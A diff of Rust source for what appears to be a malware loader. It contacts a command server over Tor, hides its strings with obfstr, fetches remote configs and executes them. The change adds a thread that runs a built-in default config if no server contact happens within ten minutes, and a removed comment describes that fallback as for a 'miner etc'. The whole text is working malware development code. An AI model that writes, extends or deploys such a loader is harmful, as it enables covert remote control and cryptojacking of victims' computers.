@@ -1,33 +1,44 @@
-use std::sync::{ Arc, RwLock };
+use std::{ sync::{ Arc, Mutex, RwLock }, time::Duration };
 use anyhow::{ Context, Result };
 use loader_vars::{
     constants::loader_version,
     types::{
-        receive::{ self, ClientParams, LoaderReceivePayload },
+        receive::{ self, ClientParams, LoaderReceivePayload, RunConfigParams },
         send::{ GetConfigParams, LoaderSendPayload, ServerAction, ServerParams },
     },
 };
-use shared::network::tor::{ LoggerConfig, ServerReceiveType, TorHandler };
+use shared::network::tor::{ LoggerConfig, MutexPtr, RwPtr, ServerReceiveType, TorHandler };
 use obfstr::obfstr as s;
 use super::utils::run_config;
 
 #[derive(Clone)]
 pub struct LoaderTorHandler {
     tor_handler: TorHandler,
+    config_executed: MutexPtr<bool>,
 }
 
 impl LoaderTorHandler {
     pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
         let tor_handler = TorHandler::new(logger_config).await?;
-        Ok(LoaderTorHandler { tor_handler })
+        let config_executed = Arc::new(Mutex::new(false));
+        Ok(LoaderTorHandler { tor_handler, config_executed })
     }
 
     pub async fn run_handler(&mut self) {
         let self_clone = Arc::new(RwLock::new(self.clone()));
         let self_clone2 = self_clone.clone();
 
-        //? if cannot connect to tor - run prewritten runconfig ( for miner etc ) still needed
-        //? ok so if in 10 min we dont connect we run predefined - do inside tor handler
+        let self_clone3 = self_clone.clone();
+
+        std::thread::spawn(move || {
+            std::thread::sleep(Duration::from_secs(60 * 10));
+            let binding = self_clone3.write().unwrap();
+            let mut run_config_done = binding.config_executed.lock().unwrap();
+            if !*run_config_done {
+                run_config(RunConfigParams::default()).unwrap();
+                *run_config_done = true;
+            }
+        });
 
         self.tor_handler.run(
             move || {
@@ -36,12 +47,11 @@ impl LoaderTorHandler {
             move |handler, data| { Self::process_data(handler.clone(), data, self_clone2.clone()) }
         ).await;
     }
-    pub fn connect_callback_init(self_ref: Arc<RwLock<Self>>) {
-        let self_guard = self_ref.read().unwrap();
+    pub fn connect_callback_init(self_ref: RwPtr<Self>) {
         let params = GetConfigParams {};
         if
             let Err(_error) = Self::send_data(
-                &self_guard.tor_handler,
+                &self_ref.read().unwrap().tor_handler,
                 ServerAction::GetConfig,
                 ServerParams::GetConfig(params)
             )
@@ -53,7 +63,7 @@ impl LoaderTorHandler {
     fn process_data(
         tor_handler: TorHandler,
         binary_data: Vec<u8>,
-        self_ref: Arc<RwLock<Self>>
+        self_ref: RwPtr<Self>
     ) -> Result<()> {
         let processed_data: LoaderReceivePayload = serde_json
             ::from_slice(&binary_data)
@@ -65,12 +75,16 @@ impl LoaderTorHandler {
     fn route_data(
         _tor_handler: TorHandler,
         processed_data: LoaderReceivePayload,
-        _self_ref: Arc<RwLock<Self>>
+        self_ref: RwPtr<Self>
     ) -> Result<()> {
         match processed_data.action {
             receive::ClientAction::RunConfig => {
                 if let ClientParams::RunConfig(params) = processed_data.params {
-                    run_config(params)?;
+                    if let Ok(()) = run_config(params) {
+                        let binding = self_ref.write().unwrap();
+                        let mut run_config_done = binding.config_executed.lock().unwrap();
+                        *run_config_done = true;
+                    }
                 } else {
                     return Err(
                         anyhow::anyhow!(
